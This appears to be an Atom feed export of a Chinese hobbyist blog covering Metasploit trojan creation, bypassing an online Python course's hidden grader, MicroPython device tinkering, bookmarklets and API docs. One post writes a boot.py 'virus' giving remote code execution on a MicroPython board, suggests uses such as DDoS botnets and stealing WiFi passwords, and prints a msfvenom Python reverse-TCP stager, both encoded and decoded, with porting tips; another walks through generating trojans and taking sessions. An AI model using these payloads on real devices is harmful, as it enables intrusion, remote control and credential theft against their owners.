 [i] Run: 运行这个位置的命令！
 [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080
 [*] Done!
</code></pre>
<h2 id="接下来呢">接下来呢？</h2>
<p>在进入监听模式后，需要用户触发恶意软件，触发后将会有一段文字代表某恶意软件开始连接到攻击方电脑，文字如下</p>
<pre><code class="language-text">[*] Started 连接类型 reverse handler on 链接地址
</code></pre>
<p>当连接完成，可以开始工作时，会出来这么一个字样：</p>
<pre><code class="language-text">[*] XXXX(省略) session 会话id opened (IP地址:攻击端口 -&gt; 另一个IP:另一个端口) 一大串时间
</code></pre>
<p>这个时候 对应到我们执行的命令里面，就是：</p>
<pre><code class="language-text">sessions 会话ID  # 表示切换到xxx会话
</code></pre>
<p>当切换到对应会话ID时，咱就能搞事了，示范中，使用了<code>shell</code>命令作为演示，实际上还可以使用<code>help</code>或<code>?</code>命令列出可使用命令</p>
<h1 id="总结">总结</h1>
<p>运行环境：<strong>Kali Linux 2023.3 VMWare虚拟机</strong></p>
<p>使用工具：<strong>Metasploit套件</strong>，其中包含msfvenom/msfconsole/msfpc等命令</p>
<p>创建木马:</p>
<pre><code class="language-bash">msfpc 攻击平台 攻击者IP 攻击端口 MSF(如果你是山顶洞人也可以CMD) 正/反向链接(bind/reverse) 存储模式(stage(less)) 连接模式(http(s),tcp)
</code></pre>
<p>等待木马上钩：<br>
找到创建木马时给出的以<code>[*] Run:</code>开头的内容，复制那一行内除<code>[*] Run:</code>以外的命令<br>
或<code>msfconsole -q -r '生成木马时额外给出的文件扩展名为.rc的文件的路径'</code></p>
<p>上钩后 使用<code>sessions [sessionID]</code>切换会话，直接执行<code>sessions</code>查看所有可用会话</p>
<p>使用<code>help</code>/<code>--help</code>/'?'在任何地方查看当前软件的帮助</p>
<p>有更多的不理解的词汇可以在后面加上<strong>msf</strong>进行搜索 查找其意思并补充在评论区</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[核桃编程-Python]课程模式下的代码会被修改吗？]]></title>
        <id>https://gxxk.site/oLE3FCiOr/</id>
        <link href="https://gxxk.site/oLE3FCiOr/">
        </link>
        <updated>2023-10-05T12:27:58.000Z</updated>
        <summary type="html"><![CDATA[<h1 id="前言">前言</h1>
<p>好吧万年一更的我又来了</p>
<p>这是我很久之前就研究过的玩意，忽然想起来了临时写一下</p>
<h1 id="摸索">摸索</h1>
<p>最开始的起因是我运行代码时发现有时报错提示行数与代码本身错误位置行数不符合（旧版本客户端特性，目前似乎已被修复？）怀疑代码被修改，于是我：</p>
<pre><code class="language-python">... # 代码
print(__file__) 
... # 代码
</code></pre>
<blockquote>
<p>Tips: <code>__file__</code>变量存储的是当前正在运行的代码的路径，但在REPL下此变量不可用</p>
</blockquote>
]]></summary>
        <content type="html"><![CDATA[<h1 id="前言">前言</h1>
<p>好吧万年一更的我又来了</p>
<p>这是我很久之前就研究过的玩意，忽然想起来了临时写一下</p>
<h1 id="摸索">摸索</h1>
<p>最开始的起因是我运行代码时发现有时报错提示行数与代码本身错误位置行数不符合（旧版本客户端特性，目前似乎已被修复？）怀疑代码被修改，于是我：</p>
<pre><code class="language-python">... # 代码
print(__file__) 
... # 代码
</code></pre>
<blockquote>
<p>Tips: <code>__file__</code>变量存储的是当前正在运行的代码的路径，但在REPL下此变量不可用</p>
</blockquote>
<!-- more -->
<p>如果没被修改，那么打印出来的结尾应该是code.py（核桃编程客户端默认代码文件名为code.py，而不是__init__.py或main.py等文件名）</p>
<p>但实际上是这样的（马赛克用于遮挡课程信息，15~19行为1种读取真实运行代码内容的方法，如方法被拦截，可能会放出）<br>
<img src="https://image-1302120057.cos.ap-nanjing.myqcloud.com/blog/20231005195557.png" alt="" loading="lazy"></p>
<p>于是，我按照此路径，读取出来了课程的代码<br>
（吐槽一下：现版本作弊通关还有点难，以前的版本直接<code>overWin(&quot;pass&quot;)</code>就可以了，我还向老师提交了这个通关方法（你猜这是真的还是假的））</p>
<p>好玩的是，居然什么也没发生，程序照常运行，没有输出任何内容</p>
<p>最开始，我怀疑是真实运行的代码不仅记录print内容，还在新版本更新中加上了一层过滤机制，于是，我使用<code>dir()</code>，查看了目前所有可调用对象：</p>
<pre><code class="language-python">['__annotations__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', '_p', 'check', 'correct_count', 'correct_country', 'country', 'country_medal_dict', 'hetao_message', 'i', 'index', 'input', 'input_list', 'ipt', 'json', 'l', 'medals', 'os', 'out_res', 'print', 'print_content', 'pt', 'r', 'random', 's', 's_json', 's_string', 'str_1', 'str_1_sub1', 'str_1_sub2', 'str_1_sub3', 'str_2', 'str_3', 'str_4', 'str_5', 'sys', 'time']
</code></pre>
<p>根据经验，真正的print名称一般是某个看起来比较抽象的缩写或同义词等，print函数只会在<code>pt()</code>,<code>print_content()</code>,<code>out_res()</code>,<code>_p()</code>这几个中出现</p>
<p>经过实践，最终<code>_p()</code>才是真正的print函数，拿到真正的_p函数后，就可以快乐的读取真实代码了~</p>
<p>ccc怎么这么长啊，不放了</p>
<h1 id="分析通用对象">分析通用对象</h1>
<p>总之大体分析了一下，根据经验，以下几个提到的东西应该大体上在这里通用</p>
<p class="note note-warning">
本文提到的所有对象可能在不同课程中不一样，请根据实际情况决定自己的行为
</p>
<ul>
<li>
<p>被替换的print函数（真正名称<code>pt</code>）<br>
该对象用于记录学生使用print输出的内容到<code>print_content</code>，不支持原生print的sep/end/file/flush参数<br>
此函数会对第一项传参（<code>print(第一项传参，第二项传参...)</code>）进行识别，如果其为<code>&quot;hetao-&quot;</code>或<code>&quot;&quot;</code>，就不会输出，也不会记录，直接停止函数运行<br>
此外，该函数还会对无任何传参的print进行过滤，正常输出但不会记录至其中</p>
</li>
<li>
<p>被替换的input函数（原input名为<code>ipt</code>）<br>
此函数不会使用到任何真正的input操作，而是会返回变量<code> s_string</code><br>
此变量会由index变量（一个由random模块中的randint函数（随机数字））操作</p>
</li>
<li>
<p>报错函数（名为<code>out_res</code>）<br>
hide-code.py内没有该函数的完整代码，调用此函数效果为正常的代码编写错误弹出的提示，并在右侧以红色输出<code>out_res</code>弹窗内相同的文字<br>
该函数会定义一个名为<code>_str</code>的局部变量，然后将其设为函数传参的最后一个传参（源代码为<code>for _a in *args:_str=str(_a)</code>），随后以退出码<code>0</code>退出（<code>sys.exit(0)</code>）</p>
</li>
<li>
<p>检查学生代码函数（名为<code>check</code>）<br>
会根据使用print/input等输入/输出函数得到的值判断学生代码是否正确<br>
检查逻辑是内置多个样本，每次运行随机选择样本输入，内置一份正确算法计算答案（存储此部分数据的变量开头一般为<code>correct_</code>），和学生运算的代码相比较，再根据细分出来的继续比较，找到代码错的原因并输出至用户界面<br>
如果满足条件，会将hetao_message某（多）项的值设置为True，程序判断是否过关疑似依赖此部分<br>
也有一部分课程中的练习，因为其难度较小且只用完成1-2行代码，可能会检测范围内是否有某特定词组/文本，如满足条件直接放行</p>
</li>
<li>
<p>可疑代码（位于学生代码执行阶段附近）<br>
此代码会出现于学生编写的代码的第一行的上一行，内容为<code>print(&quot;::walnut_cpp_scheme&quot;)</code>，疑似用于与核桃编程用户界面交互  <s>建议直接“一切皆文件”（</s></p>
</li>
<li>
<p>程序结尾<br>
此部分代码位于学生程序结尾，较简单，大致为调用<code>check</code>函数并根据其函数操作<code>hetao_message</code>的结果判断是否执行特定语句（如输出作业完成，点击提交等）</p>
</li>
</ul>
<h1 id="结尾">结尾</h1>
<p>看起来似乎每个课程都会有专属的附加代码，挺佩服核桃程序员的工作量的（）</p>
<p>如果有任何纰漏欢迎在<a href="https://gxxk.site">https://gxxk.site</a>指出（</p>
<p>对了顺便讲一声，此文在<a href="https://gxxk.site">https://gxxk.site</a>同时发布，可以来小站看看LOL</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[【水】【突发其想】掌控版注入病毒？]]></title>
        <id>https://gxxk.site/vvRbZpds4/</id>
        <link href="https://gxxk.site/vvRbZpds4/">
        </link>
        <updated>2023-07-02T15:36:17.000Z</updated>
        <summary type="html"><![CDATA[<p>众所周知，掌控版基于<strong>microPython</strong>，有许多好玩的模块/特性，包括但不限于：</p>
<ul>
<li>_thread多线程</li>
<li>exec执行代码</li>
<li>compile编译代码</li>
<li>“胶水”语言</li>
</ul>
]]></summary>
        <content type="html"><![CDATA[<p>众所周知，掌控版基于<strong>microPython</strong>，有许多好玩的模块/特性，包括但不限于：</p>
<ul>
<li>_thread多线程</li>
<li>exec执行代码</li>
<li>compile编译代码</li>
<li>“胶水”语言</li>
</ul>
<!-- more -->
<p>那么，我们是否可以拿这些好玩的特性搞事情呢？已知：</p>
<ul>
<li>有人移植了可在掌控版上可用的Flask（广泛意义上）</li>
<li>microPython拥有boot.py，优先级最高，上电必须执行</li>
<li>使用_thread和预编译可以在几乎无感的情况下注入代码在boot.py内</li>
</ul>
<p>我们就可以设想：</p>
<p>在boot.py文件最顶端写入这样一段代码：</p>
<pre><code class="language-python">import virus
virus.virus()
</code></pre>
<p>然后，我们再在virus.py写入我们更详细的代码</p>
<pre><code class="language-python">def virus():
    from _thread import start_new_thread
    from urouter import uRouter
    server=uRouter()
    @server.route(&quot;/exec/&lt;command&gt;&quot;)
    def exec(command):
        try:return str(exec(command))
        except:return &quot;Error!&quot;
    start_new_thread(server.serve_forever,())
</code></pre>
<p>这里只是一个示例，但是实际上能做的事非常多，具体的还请各位看官自行想象，如：</p>
<ul>
<li>成为肉鸡（指机器被黑客的远控程序控制）去DDOS他人网站</li>
<li>吓人，跟病毒一样</li>
<li>获取main.py程序并从中提取敏感信息（如WiFi密码（大多数人会拿手机号作为密码））</li>
<li>妨碍用户正常使用（如多开线程使代码卡顿，申请大量内存等）</li>
<li>无限复制，潜伏到每个程序内</li>
</ul>
<h1 id="后续-231208更新">后续-23.12.08更新</h1>
<p>最近全面的了解了一下~~msfpc(划掉)~~msfvenom，发现这玩意可玩性十分之高，甚至支持Python，随手生成了一个看看</p>
<pre><code class="language-text">┌──(kali㉿kali)-[~]
└─$ msfpc Python 127.0.0.1 11451                            
 [*] MSFvenom Payload Creator (MSFPC v1.4.5)
 [i]   IP: 127.0.0.1
 [i] PORT: 11451
 [i] TYPE: python (python/meterpreter/reverse_tcp)
 [i]  CMD: msfvenom -p python/meterpreter/reverse_tcp -f raw \
  --platform python -e generic/none -a python LHOST=127.0.0.1 LPORT=11451 \
  &gt; '/home/kali/python-meterpreter-staged-reverse-tcp-11451.py'

 [i] python meterpreter created: '/home/kali/python-meterpreter-staged-reverse-tcp-11451.py'
                                                                                                                                                            
 [i] MSF handler file: '/home/kali/python-meterpreter-staged-reverse-tcp-11451-py.rc'                                                                       
 [i] Run: msfconsole -q -r '/home/kali/python-meterpreter-staged-reverse-tcp-11451-py.rc'                                                                   
 [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080                                                                                
 [*] Done!                                                                                                                                                  
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ cat python-meterpreter-staged-reverse-tcp-11451.py                                             
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9T8FKxDAQPTdfkVsSjKFZuissVhDxICILrjcRaZNRQ9M0JFmtK/67DVlkYIb35s2bGTP6KSQcJzVA4kdret53ETYNjykcVOLJjIDepoBnbBwOnXsHKmu2RVUK30uuYluGRSl0xU94v7u5f90/Pd5eP7CsE2pyDlSilMjVhaiXkIRL2awly4I+QDegCmYFPmXnvFpEC+DpmiHblovEwflODZRc3REeRQD1SRvGnusXpNsTtgx9fRgL2IKjml3axU6f/XfPC80QzKBoflpoUNPoA8RIy/+i3zSZ1JCV/IdEso2/DP0BLLxehQ==')[0])))                                                                                                                                                            
                                                    
┌──(kali㉿kali)-[~]
└─$ cat python-meterpreter-staged-reverse-tcp-11451-py.rc
#
# [Kali]: msfdb start; msfconsole -q -r '/home/kali/python-meterpreter-staged-reverse-tcp-11451-py.rc'
#
use exploit/multi/handler
set PAYLOAD python/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 11451
set ExitOnSession false
set EnableStageEncoding true
#set AutoRunScript 'post/windows/manage/migrate'
run -j
</code></pre>
<blockquote>
<p>Tip:在Python平台下，不支持创建STAGELESS模式的恶意代码</p>
</blockquote>
<p>去掉恶意代码的<code>exec()</code>，放入REPL内执行并print看看：</p>
<pre><code class="language-text">PS C:\Users\user\Downloads&gt; python
Python 3.10.5 (tags/v3.10.5:f377153, Jun  6 2022, 16:14:13) [MSC v.1929 64 bit (AMD64)] on win32
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&gt;&gt;&gt; print(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9T8FKxDAQPTdfkVsSjKFZuissVhDxICILrjcRaZNRQ9M0JFmtK/67DVlkYIb35s2bGTP6KSQcJzVA4kdret53ETYNjykcVOLJjIDepoBnbBwOnXsHKmu2RVUK30uuYluGRSl0xU94v7u5f90/Pd5eP7CsE2pyDlSilMjVhaiXkIRL2awly4I+QDegCmYFPmXnvFpEC+DpmiHblovEwflODZRc3REeRQD1SRvGnusXpNsTtgx9fRgL2IKjml3axU6f/XfPC80QzKBoflpoUNPoA8RIy/+i3zSZ1JCV/IdEso2/DP0BLLxehQ==')[0])).decode())
import socket,zlib,base64,struct,time
for x in range(10): # 循环为链接攻击者
        try:
                s=socket.socket(2,socket.SOCK_STREAM)
                s.connect(('攻击者IP',端口))
                break
        except:
                time.sleep(5)
l=struct.unpack('&gt;I',s.recv(4))[0] 
d=s.recv(l)
while len(d)&lt;l:
        d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})
&gt;&gt;&gt;
</code></pre>
<p>大致分析，即为以下几步</p>
<ol>
<li>尝试连接攻击者10次</li>
<li>连接后，接受一次消息，确认即将接受并执行的payload的总长度</li>
<li>再次进行一次获取消息，此时获取的是用于进行控制的payload</li>
<li>使用循环作再次接受payload，确保payload接收完毕</li>
<li>执行payload，并将与攻击者链接的socket传入代码内，便于其他操作</li>
</ol>
<p>这段代码经过简单修改，即可适用于掌控版，此处因篇幅原因不再列出，提供一下可修改点便于看官自行实践：</p>
<ol>
<li>更换模块<code>base64</code>为<code>ubinascii.a2b（或b2a）_base64</code></li>
<li>使用模块<code>_thread</code>多线程防止阻塞</li>
<li>更换所有模块为适用于microPython的<code>u xxxxx</code>，例如<code>socket</code> -&gt; <code>usocket</code>等</li>
<li>原payload长度1784line，需要根据掌控版特性/硬件进行代码修改缩减或完全重写，例如咱就不需要<code>getsystem</code>命令和<code>webcam</code>开头的命令</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[记录一下自己用到的一些小工具]]></title>
        <id>https://gxxk.site/9NcwXevnf/</id>
        <link href="https://gxxk.site/9NcwXevnf/">
        </link>
        <updated>2023-06-24T12:46:49.000Z</updated>
        <summary type="html"><![CDATA[<p>如题，简单记录一下免安装的一些网页小工具（100%安全！）</p>
<p>(持续更新中<span class="heimu">....?</span>)</p>
<h1 id="视频播放工具箱">视频播放工具箱</h1>
<p>其实主要就是就是可以快捷调整倍速这个功能，无聊，于是把一堆好玩（没用（划掉））的功能给搞了进</p>
]]></summary>
        <content type="html"><![CDATA[<p>如题，简单记录一下免安装的一些网页小工具（100%安全！）</p>
<p>(持续更新中<span class="heimu">....?</span>)</p>
<h1 id="视频播放工具箱">视频播放工具箱</h1>
<p>其实主要就是就是可以快捷调整倍速这个功能，无聊，于是把一堆好玩（没用（划掉））的功能给搞了进</p>
<!-- more -->
<pre><code class="language-javascript">javascript:userInput=prompt(&quot;---视频播放工具箱---\n请输入需要使用的选项(使用序号标注，可选输入：1-6之间的数)：\n  倍速设置\n  视频播放进度修改\n  暂停时自动播放\n  禁用播放器的pause函数\n  播放视频\n  强制暂停视频（4选项启用后仍可使用）&quot;);if(userInput==1){try{document.querySelector(&quot;video&quot;).playbackRate=parseInt(prompt(&quot;请输入要调整的视频倍速：0.1~16&quot;));alert(&quot;已成功将使用 `&lt;video&gt;`   标签的视频调整为指定倍速&quot;)}catch(error){alert(&quot;调整失败！请输入正确的值！&quot;)}};if(userInput==2){try{document.querySelector(&quot;video&quot;).currentTime=parseFloat(prompt(&quot;请输入指定时间（以秒为单位，可使用小数点）&quot;))}catch(error){alert(&quot;调整失败！请确保输入的是否是正确的数据！&quot;)}}if(userInput==3){document.querySelector(&quot;video&quot;).addEventListener(&quot;pause&quot;,function(){document.querySelector(&quot;video&quot;).play()});alert(&quot;启用成功！如刷新页面，此功能将消失&quot;)}if(userInput==4){PauseFunc=document.querySelector(&quot;video&quot;).pause; document.querySelector(&quot;video&quot;).pause=function(){};alert(&quot;启用成功！如刷新页面，此功能将消失&quot;)}if(userInput==5){document.querySelector(&quot;video&quot;).play()}if(userInput==6){PauseFunc()}
</code></pre>
<h1 id="网页翻译">网页翻译</h1>
<p>来源于我在Gitee上看见的一个很优秀的开源项目，可实现HTML全自动翻译为指定语言</p>
<p>项目传送门：<a href="https://gitee.com/mail_osc/translate">https://gitee.com/mail_osc/translate</a></p>
<p>然后在这一栏中，给出了一个对于非开发者用户使用的代码，于是经过我极少量修改后拿来用了（见下方）<br>
<a href="https://gitee.com/mail_osc/translate/blob/master/doc/README.cn.md#%E5%85%88%E6%8B%BF%E5%88%AB%E4%BA%BA%E7%9A%84%E7%BD%91%E7%AB%99%E5%8A%A8%E6%89%8B%E8%AF%95%E8%AF%95">https://gitee.com/mail_osc/translate/blob/master/doc/README.cn.md#先拿别人的网站动手试试</a></p>
<p>下边是代码：</p>
<pre><code class="language-javascript">javascript:try{dom=document.getElementById(&quot;translate&quot;);dom.parentNode.removeChild(dom);}catch(error){var head= document.getElementsByTagName('head')[0]; var script= document.createElement('script'); script.type= 'text/javascript'; script.src= 'https://res.zvo.cn/translate/inspector_v2.js'; head.appendChild(script);}
</code></pre>
<p>这个里面我还加了一个功能：加载翻译窗口后，再执行一次会关闭原来的翻译窗口</p>
<h1 id="外挂聊天室">外挂聊天室</h1>
<p>此“外挂”非你们想的那个vape/wurst之类的游戏作弊软件，而是字面意义上的外挂（外置的网站聊天室）</p>
<p>此工具出处:<a href="https://ld246.com/article/1534741351807?r=icheer">https://ld246.com/article/1534741351807?r=icheer</a></p>
<p>下边是代码：</p>
<pre><code class="language-javascript">javascript:var s=document.createElement('script');s.src='//topurl.cn/chat.js';document.body.append(s);
</code></pre>
<h1 id="网页控制台">网页控制台</h1>
<p>这个是基于由腾讯编写的前端轻量网页开发控制台（很绕对不对？理解成一个很牛x的到处都能用的网页修改器就ok了）<strong>vConsole</strong>而来的</p>
<p>vConsole项目链接：<a href="https://gitee.com/Tencent/vConsole">https://gitee.com/Tencent/vConsole</a></p>
<p>这里我们按照常规操作，先创建一个JS对象，指定代码来源网址（src属性），然后添加到网页内，等待几秒后运行</p>
<p>代码：</p>
<pre><code class="language-javascript">javascript:var s=document.createElement('script');s.src='//unpkg.com/vconsole@latest/dist/vconsole.min.js';document.body.append(s);setTimeout(function(){var vConsole = new window.VConsole();},5000)
</code></pre>
<p>其中的5000是延时时间，单位为毫秒，代码导入开始到结束是有一段时间的，这段时间动不了模块内的函数，所以需要做延时处理</p>
<p>当然，上边这堆东西，直接添加到书签内，或者在打开页面后把代码粘贴到地址栏内回车运行，都可以使用</p>
<p>遇到Bug:<br>
所有小脚本<strong>都经过本人实质性验证</strong>，有基础的可以自行尝试把代码放到DevTools内执行分析Bug，一般情况下出现<strong>xxxx未定义</strong>，一般是这个脚本需要导入外部的另一个脚本，在<strong>没有导入完成</strong>的时候，代码刚好直接<strong>启动外部脚本</strong>，建议<strong>划到页面最开始的地方等待脚本加载</strong>，如果还出错误，大概率是<strong>CSP</strong>的锅，这个是个网站安全规则的设置问题，部分相对而言安全的网站有可能启用了CSP，这玩意可以防攻击，但是加载从JS导入外部脚本并且脚本所在位置不是网站的地址的话，这个导入就会有可能被ban掉</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[记一下关于掌控版实现截屏的研究]]></title>
        <id>https://gxxk.site/mz6lEJuK9/</id>
        <link href="https://gxxk.site/mz6lEJuK9/">
        </link>
        <updated>2023-06-24T07:13:19.000Z</updated>
        <summary type="html"><![CDATA[<p><strong>多图预警</strong></p>
<h1 id="开头">开头</h1>
<p>6.20下午1点左右，在STFP钉钉总群内（后面提到的聊天内容若无特殊注明基本都在这个群里），群友“emo的程序大神”（在U圈子内名称为“沉默”，后面简称emo）提出了想法：</p>
]]></summary>
        <content type="html"><![CDATA[<p><strong>多图预警</strong></p>
<h1 id="开头">开头</h1>
<p>6.20下午1点左右，在STFP钉钉总群内（后面提到的聊天内容若无特殊注明基本都在这个群里），群友“emo的程序大神”（在U圈子内名称为“沉默”，后面简称emo）提出了想法：</p>
<!-- more -->
<figure data-type="image" tabindex="1"><img src="https://image-1302120057.cos.ap-nanjing.myqcloud.com/blog/20230624165327.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://image-1302120057.cos.ap-nanjing.myqcloud.com/blog/20230624165626.png" alt="" loading="lazy"></figure>
<p>群友“Mask”（U圈子站长，后面简称“Mask”）和emo一起明确了具体实现方法：</p>
<figure data-type="image" tabindex="3"><a href="https://imgse.com/i/pCtwjp9"><img src="https://s1.ax1x.com/2023/06/24/pCtwjp9.png" alt="pCtwjp9.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="4"><a href="https://imgse.com/i/pCtwzOx"><img src="https://s1.ax1x.com/2023/06/24/pCtwzOx.png" alt="pCtwzOx.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="5"><a href="https://imgse.com/i/pCt0CTO"><img src="https://s1.ax1x.com/2023/06/24/pCt0CTO.png" alt="pCt0CTO.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="6"><a href="https://imgse.com/i/pCt0Epd"><img src="https://s1.ax1x.com/2023/06/24/pCt0Epd.png" alt="pCt0Epd.png" loading="lazy"></a></figure>
<h1 id="oled库特性">oled库特性</h1>
<h2 id="oled类继承了哪些类">oled类继承了哪些类</h2>
<p>大致来讲就是大家通过查成分（bushi）查到了oled库是继承ssd1106_i2c类而来，ssd1106_i2c类是继承类framebuffer而来，所以很多framebuffer/ssd1106内的函数，都可以在oled库内使用到，而其中有1个比较重要的点：</p>
<h3 id="小提示">小提示</h3>
<blockquote>
<p>Tips: framebuf和framebuffer在文中指的是2个不同的概念，framebuffer是模块（屏幕绘图缓冲区模块），framebuf是一个需要初始化的类，包含在framebuffer内</p>
</blockquote>
<h2 id="pixel函数">pixel函数</h2>
<p>并且，我们发现了函数pixel()，它集成在framebuf类里面，掌控版的中文文字显示函数DispChar()就是基于pixel()函数，在不指定颜色的情况下，还可以得到x,y像素点的状态（0黑1白）</p>
<p>由此，我们想出了2种路线：</p>
<h1 id="函数套壳法">函数套壳法</h1>
<blockquote>
<p>此部分仅在理论上成立，未完全实际检验成果！</p>
</blockquote>
<p>函数套壳，乍一听很抽象，其实就是把原来的函数定义成一个变量内，再定义一个和原来函数同名的函数，这个函数内可以对函数传参做处理，然后再调用原函数</p>
<p>是不是很抽象？看一下代码就明白了！</p>
<h2 id="函数套壳-介绍">函数套壳-介绍</h2>
<p>这是原代码：</p>
<pre><code class="language-python">def hello(name):
    print(f&quot;你好，{name}&quot;) # f&quot;xxx{变量名}xxx&quot;是新版Python产生的format函数的新一种写法（个人理解），可以写成&quot;xxx&quot;+变量名+&quot;xxx&quot;
</code></pre>
<p>使用<code>hello(&quot;小明&quot;)</code>调用后返回：</p>
<pre><code class="language-text">你好，小明
</code></pre>
<p>我需要一个日志功能，在每次打印问候语时前面都标注出用户执行了hello函数，在问候谁（？），那么我们可以在不能修改原来已经定义好，无法修改源代码的函数上套一层壳，就像这样：</p>
<pre><code class="language-python">def hello(name):
    print(f&quot;你好，{name}&quot;)
# 假设从这里到代码开始的部分不能修改

hello_=hello # 转移原来的函数
def hello(name):
    print(f&quot;[日志]执行函数：hello，name参数内容：{name}&quot;)
    hello(name)
</code></pre>
<p>现在再使用<code>hello(&quot;小明&quot;)</code>调用后返回：</p>
<pre><code class="language-text">[日志]执行函数：hello，name参数内容：小明
你好，小明
</code></pre>
<p>没错，你已经正确理解了函数套壳的意思，但是它似乎看起来没什么卵用，没关系，本文讲的掌控版截屏中的这个实现方法，就是基于函数套壳而来的（在这层壳里记载绘制函数在什么时候被调用），但是因为作者太懒，不想写这部分代码，参数太难搞了，所以另辟蹊径，采用了一个笨方法（具体见方法：<a href="#%E9%81%8D%E5%8E%86%E5%B1%8F%E5%B9%95%E6%B3%95">遍历屏幕法</a>）</p>
<h1 id="遍历屏幕法">遍历屏幕法</h1>
<p>顾名思义，就是反复执行oled.pixel()函数128*64(8192)次，得出每个像素点的状态，然后存在一个二位数组内，算法简单暴力，想出这个算法后很快就有了最初的实现：</p>
<pre><code class="language-python">[[oled.pixel(j,i) for j in range(128)] for i in range(64)]
</code></pre>
<p>没错，就是这么简单粗暴，2s内完成（其他实现方法需要7s甚至更多），但是这么个小东西却占用了70kb的RAM，紧接着，emo的截屏程序也诞生了，他的程序会直接将数据逐行扫描，写入pbm格式的文件中这里就直接挂张图，各位细看吧</p>
<figure data-type="image" tabindex="7"><img src="https://image-1302120057.cos.ap-nanjing.myqcloud.com/blog/d573828410daa7738be806abac1e347b.png" alt="" loading="lazy"></figure>
<p>这个执行要7s，内存占用还没有测试，但是应该小多了，可以直接集成到大型程序内且不需要预编译程序</p>
<p>还有一部分优化版本，这些可以在<a href="http://bbs.tethys.asia/">U圈子</a>内发个贴找其他人要程序</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[GxxkAPI帮助文档]]></title>
        <id>https://gxxk.site/GxxkAPi/</id>
        <link href="https://gxxk.site/GxxkAPi/">
        </link>
        <updated>2023-06-09T11:45:17.000Z</updated>
        <summary type="html"><![CDATA[<blockquote>
<p>该插件目前还处于测试阶段，帮助文档可能会有疏漏，出现任何Bug直接在LabPlus论坛评论区留言即可！</p>
</blockquote>
<p>GxxkAPI是由Gxxk开发的，基于硬件<strong>掌控版</strong>，固件<strong>microPython</strong>，的一款工具箱，集成了很多原本<strong>掌控版</strong>/<strong>microPython</strong>所<strong>没有的</strong>功能</p>
]]></summary>
        <content type="html"><![CDATA[<blockquote>
<p>该插件目前还处于测试阶段，帮助文档可能会有疏漏，出现任何Bug直接在LabPlus论坛评论区留言即可！</p>
</blockquote>
<p>GxxkAPI是由Gxxk开发的，基于硬件<strong>掌控版</strong>，固件<strong>microPython</strong>，的一款工具箱，集成了很多原本<strong>掌控版</strong>/<strong>microPython</strong>所<strong>没有的</strong>功能</p>
<!-- more -->
<h1 id="下载gxxkapi">下载GxxkAPI</h1>
<p>在内测群或最新版GxxkAPI下载GxxkAPI安装脚本，刷入后将会自动安装</p>
<h1 id="加入gxxkapi内测群">加入GxxkAPI内测群</h1>
<p>GxxkAPI更新进度缓慢，新特性往往无法快速使用，这时您可以选择加入内测群，与我（作者）直接沟通，反馈Bug</p>
<h2 id="加入内测钉钉群">加入内测钉钉群</h2>
<p>群号：33450012123</p>
<figure data-type="image" tabindex="1"><img src="https://image-1302120057.cos.ap-nanjing.myqcloud.com/blog/20230701113706.png" alt="" loading="lazy"></figure>
<h2 id="内测群群规">内测群群规</h2>
<p>欢迎来到GxxkAPI内测群！</p>
<p>您在群内应当将自己的群昵称改为论坛名，否则将踢出群聊</p>
<p>本群不允许以任何形式在群内对其他成员进行侮辱，请友好交流</p>
<p>允许在本群以外的位置传播GxxkAPI内测版本，但是不应过度占用论坛公共资源，如将每个经过修改的内测版本发在帖子内（一个文件一张帖子的形式）</p>
<p>GxxkAPI是闭源的，禁止在无授权的情况下反编译/二次分发/二次修改GxxkAPI源码</p>
<p>如您违反了群规，我们将会视情况做出相应的处罚，包括但不限于：</p>
<ul>
<li>5min-30day的禁言</li>
<li>在LabPlus论坛发帖公示违规行为和对应的论坛用户名</li>
<li>如情节严重，我们将会联合STFP、CiBX.等将您加入黑名单</li>
</ul>
<p>最后，祝您玩的愉快！</p>
<h1 id="初始化gxxkapi">初始化GxxkAPI</h1>
<p>GxxkAPI需要使用<code>from GxxkAPI import GxxkAPI</code>导入模块，GxxkAPI被设计为需要使用<code>GxxkAPI.GxxkAPI.__init__()</code>函数来进行初始化，在此之前，GxxkAPI模块的命名空间内除了<strong>私有函数</strong>，使用的<strong>模块</strong>等对象以外，只有GxxkAPI类可以进行初始化，所有功能均存放在私有函数/类内，只有初始化后才可使用</p>
<p>具体实现代码：</p>
<pre><code class="language-python">from GxxkAPI import *
GxxkAPI=GxxkAPI()
# 此时，您可以使用GxxkAPI进行编程了
</code></pre>
<h1 id="文件是否存在-fileisexists函数">文件是否存在-FileIsExists函数</h1>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a></p>
<p>作用：<br>
检测目录/文件是否存在</p>
<p>需传入参数：<br>
filePath-需要检测的文件路径</p>
<p>返回值：<br>
（布尔值）True（文件存在）或False（文件不存在）</p>
<p>实例：</p>
<pre><code class="language-python">if GxxkAPI.FileIsExists(&quot;/Dir/File&quot;): #此处路径可以使用/和\\，\\将被自动解析为/
    print(&quot;文件存在！&quot;)
else:
    print(&quot;文件不存在！&quot;)
</code></pre>
<h1 id="配置文件-config类">配置文件-config类</h1>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a></p>
<p>作用：<br>
更方便的配置操作</p>
<p>初始化方法：</p>
<pre><code class="language-python">cfgClass=GxxkAPI.config(&quot;/configFilePath&quot;) #在此填写配置文件路径，\将被自动解析为/
</code></pre>
